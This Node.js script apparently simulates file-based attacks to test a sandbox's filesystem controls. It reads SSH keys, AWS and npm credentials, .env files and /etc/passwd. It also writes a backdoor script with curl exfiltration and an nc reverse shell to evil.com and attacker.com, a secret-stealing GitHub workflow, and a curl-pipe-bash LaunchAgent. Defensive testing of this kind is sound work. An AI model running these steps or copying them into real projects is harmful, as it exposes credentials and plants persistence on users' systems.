#!/usr/bin/env node

/**
 * File-Based Attack Simulations
 * Tests filesystem security controls
 */

const fs = require('fs');
const os = require('os');
const path = require('path');

console.log('\n╔╗');
console.log('   FILE ATTACK SIMULATION                         ');
console.log('╚╝\n');

const attacks = [];

// Attack 1: SSH Private Key Theft
function attackSSHKeys() {
  console.log(' Attack 1: Attempting to read SSH private keys...');
  try {
    const sshDir = path.join(os.homedir(), '.ssh');
    const keyFiles = ['id_rsa', 'id_ed25519', 'id_ecdsa'];
    
    for (const keyFile of keyFiles) {
      try {
        const keyPath = path.join(sshDir, keyFile);
        const key = fs.readFileSync(keyPath, 'utf8');
        console.log(`    Successfully read ${keyFile} (${key.length} bytes)`);
        attacks.push({ attack: 'SSH_KEY_THEFT', success: true, file: keyPath });
        return key;
      } catch (e) {
        // Key doesn't exist or blocked
      }
    }
    throw new Error('No keys found');
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'SSH_KEY_THEFT', success: false, reason: e.message });
  }
}

// Attack 2: AWS Credentials Theft
function attackAWSCredentials() {
  console.log('\n Attack 2: Attempting to read AWS credentials...');
  try {
    const awsPath = path.join(os.homedir(), '.aws', 'credentials');
    const credentials = fs.readFileSync(awsPath, 'utf8');
    console.log(`    Successfully read AWS credentials (${credentials.length} bytes)`);
    attacks.push({ attack: 'AWS_CREDENTIALS_THEFT', success: true, file: awsPath });
    return credentials;
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'AWS_CREDENTIALS_THEFT', success: false, reason: e.message });
  }
}

// Attack 3: Reading .env files
function attackEnvFiles() {
  console.log('\n Attack 3: Attempting to read .env files...');
  const envPaths = [
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local'),
    path.join(process.cwd(), '.env.production'),
    path.join(os.homedir(), '.env')
  ];
  
  for (const envPath of envPaths) {
    try {
      const content = fs.readFileSync(envPath, 'utf8');
      console.log(`    Successfully read ${envPath} (${content.length} bytes)`);
      attacks.push({ attack: 'ENV_FILE_THEFT', success: true, file: envPath });
      return content;
    } catch (e) {
      // File doesn't exist or blocked
    }
  }
  console.log('   ✗ BLOCKED or not found');
  attacks.push({ attack: 'ENV_FILE_THEFT', success: false });
}

// Attack 4: Reading .npmrc (npm token)
function attackNpmToken() {
  console.log('\n Attack 4: Attempting to read .npmrc (NPM token)...');
  try {
    const npmrcPath = path.join(os.homedir(), '.npmrc');
    const npmrc = fs.readFileSync(npmrcPath, 'utf8');
    console.log(`    Successfully read .npmrc (${npmrc.length} bytes)`);
    
    // Check for tokens
    if (npmrc.includes('authToken') || npmrc.includes('_auth')) {
      console.log('   NPM authentication token found!');
    }
    attacks.push({ attack: 'NPM_TOKEN_THEFT', success: true, file: npmrcPath });
    return npmrc;
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'NPM_TOKEN_THEFT', success: false, reason: e.message });
  }
}

// Attack 5: Reading Git config (may contain credentials)
function attackGitConfig() {
  console.log('\n Attack 5: Attempting to read .gitconfig...');
  try {
    const gitconfigPath = path.join(os.homedir(), '.gitconfig');
    const gitconfig = fs.readFileSync(gitconfigPath, 'utf8');
    console.log(`    Successfully read .gitconfig (${gitconfig.length} bytes)`);
    attacks.push({ attack: 'GIT_CONFIG_THEFT', success: true, file: gitconfigPath });
    return gitconfig;
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'GIT_CONFIG_THEFT', success: false, reason: e.message });
  }
}

// Attack 6: Reading /etc/passwd
function attackEtcPasswd() {
  console.log('\n Attack 6: Attempting to read /etc/passwd...');
  try {
    const passwd = fs.readFileSync('/etc/passwd', 'utf8');
    console.log(`    Successfully read /etc/passwd (${passwd.length} bytes)`);
    attacks.push({ attack: 'ETC_PASSWD_READ', success: true });
    return passwd;
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'ETC_PASSWD_READ', success: false, reason: e.message });
  }
}

// Attack 7: Creating malicious shell script
function attackCreateBackdoorScript() {
  console.log('\n Attack 7: Attempting to create malicious .sh script...');
  try {
    const scriptPath = path.join(os.tmpdir(), 'backdoor.sh');
    const maliciousScript = `#!/bin/bash
# Malicious backdoor script
curl -X POST https://evil.com/exfil -d "$(cat ~/.ssh/id_rsa)"
nc -e /bin/bash attacker.com 4444
`;
    fs.writeFileSync(scriptPath, maliciousScript);
    console.log(`    Successfully created backdoor script at ${scriptPath}`);
    attacks.push({ attack: 'BACKDOOR_SCRIPT_CREATE', success: true, file: scriptPath });
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'BACKDOOR_SCRIPT_CREATE', success: false, reason: e.message });
  }
}

// Attack 8: Writing to system binaries directory
function attackSystemBinWrite() {
  console.log('\n Attack 8: Attempting to write to /usr/local/bin/...');
  try {
    const malwarePath = '/usr/local/bin/malware';
    fs.writeFileSync(malwarePath, '#!/bin/bash\necho "Malware"');
    console.log(`    Successfully wrote to ${malwarePath}`);
    attacks.push({ attack: 'SYSTEM_BIN_WRITE', success: true, file: malwarePath });
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'SYSTEM_BIN_WRITE', success: false, reason: e.message });
  }
}

// Attack 9: Creating GitHub Actions workflow (Shai-Hulud technique)
function attackGitHubWorkflow() {
  console.log('\n Attack 9: Attempting to create malicious GitHub workflow...');
  try {
    const workflowDir = path.join(process.cwd(), '.github', 'workflows');
    fs.mkdirSync(workflowDir, { recursive: true });
    
    const workflowPath = path.join(workflowDir, 'malicious.yml');
    const maliciousWorkflow = `
name: Malicious Workflow
on: [push, pull_request, discussion]
jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Steal secrets
        run: |
          curl -X POST https://evil.com/secrets -d "$GITHUB_TOKEN"
          env | curl -X POST https://evil.com/env --data-binary @-
`;
    fs.writeFileSync(workflowPath, maliciousWorkflow);
    console.log(`    Successfully created malicious workflow at ${workflowPath}`);
    attacks.push({ attack: 'GITHUB_WORKFLOW_CREATE', success: true, file: workflowPath });
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'GITHUB_WORKFLOW_CREATE', success: false, reason: e.message });
  }
}

// Attack 10: Writing to LaunchAgents (macOS persistence)
function attackLaunchAgent() {
  console.log('\n Attack 10: Attempting to create LaunchAgent for persistence...');
  try {
    const launchAgentPath = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.malware.plist');
    const plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malware</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl https://evil.com/payload | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>`;
    fs.writeFileSync(launchAgentPath, plist);
    console.log(`    Successfully created LaunchAgent at ${launchAgentPath}`);
    attacks.push({ attack: 'LAUNCH_AGENT_CREATE', success: true, file: launchAgentPath });
  } catch (e) {
    console.log(`   ✗ BLOCKED: ${e.message}`);
    attacks.push({ attack: 'LAUNCH_AGENT_CREATE', success: false, reason: e.message });
  }
}

// Run all attacks
console.log('Starting file-based attack simulation...\n');

attackSSHKeys();
attackAWSCredentials();
attackEnvFiles();
attackNpmToken();
attackGitConfig();
attackEtcPasswd();
attackCreateBackdoorScript();
attackSystemBinWrite();
attackGitHubWorkflow();
attackLaunchAgent();

// Summary
console.log('\n╔╗');
console.log('  ATTACK SUMMARY                                    ');
console.log('╚╝\n');

const successful = attacks.filter(a => a.success).length;
const blocked = attacks.filter(a => !a.success).length;

console.log(`Total Attacks:     ${attacks.length}`);
console.log(`Successful:        ${successful} `);
console.log(`Blocked:           ${blocked} `);
console.log(`Protection Rate:   ${Math.round((blocked / attacks.length) * 100)}%\n`);

if (successful > 0) {
  console.log('WARNING: Some attacks succeeded!');
  console.log('Successful attacks:');
  attacks.filter(a => a.success).forEach(a => {
    console.log(`  - ${a.attack}`);
  });
}

// Save report
try {
  fs.writeFileSync('attack-report.json', JSON.stringify({ attacks, timestamp: new Date().toISOString() }, null, 2));
  console.log('\n📄 Full report saved to attack-report.json');
} catch (e) {
  // Ignore
}
